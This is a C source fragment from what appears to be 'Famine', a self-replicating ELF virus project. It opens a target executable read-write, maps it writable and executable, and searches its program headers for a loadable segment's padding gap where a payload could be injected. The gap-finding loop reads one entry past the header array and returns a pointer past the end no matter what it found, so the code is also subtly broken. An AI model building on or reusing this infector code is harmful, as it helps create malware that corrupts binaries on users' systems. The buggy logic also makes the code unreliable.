

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <elf.h>

#include "famine.h"

/*
 * Open the file specified by fname
 * Calculate the size of this file
 * Create a mapping in the virtual address space of the calling process
 * Return the value of the opened fd on success
 * Return -1 on error
 */
int	elf_open_and_map(t_info *elf)
{
	elf->fd = -1;
	elf->fsize = 0;
	elf->mmap = NULL;

	elf->fd = open(elf->fname, O_APPEND | O_RDWR, 0);
	if (elf->fd == -1)
	{
#if DEBUG
		perror("open:");
#endif
		return -1;
	}

	elf->fsize = lseek(elf->fd, 0, SEEK_END);
	if (elf->fsize == -1)
	{
#if DEBUG
		perror("lseek:");
#endif
		return -1;
	}
	else if (lseek(elf->fd, 0, SEEK_SET) == -1)
	{
#if DEBUG
		perror("lseek:");
#endif
		return -1;
	}

	elf->mmap = mmap(0, elf->fsize, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, elf->fd, 0);
	if (elf->mmap == MAP_FAILED)
	{
#if DEBUG
		perror("mmap:");
#endif
		return -1;
	}

#if DEBUG
		printf("+File mapped: %ld bytes at %p\n", elf->fsize, elf->mmap);
#endif
		return elf->fd;
}


/*
// PF_X | PF_W == 0x011 ie write and execute permissions
if (elf_seg->p_type == PT_LOAD && elf_seg->p_flags & (PF_X | PF_W))
*/

Elf64_Phdr *	elf_find_gap(t_target *target)
{
	Elf64_Phdr	*phdr = (Elf64_Phdr *)((uint64_t)target->Ehdr + (uint64_t)target->Ehdr->e_phoff);
	uint16_t	e_phnum = target->Ehdr->e_phnum;
	int			i = 0;

	for (i = 0; i <= e_phnum; i++)
	{
		if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags & (PF_X | PF_W))
		{
#if DEBUG
			printf("+.text_segment found at addr:%p\n", (void *)&phdr[i]);
			printf("  +.padding zone of %lu bytes found at addr:%p\n",
					phdr[i].p_memsz - phdr[i].p_filesz,
					(void *)((uint64_t)&phdr[i] + (uint64_t)&phdr[i].p_offset));
#endif
		}
	}
	return phdr + i;
}
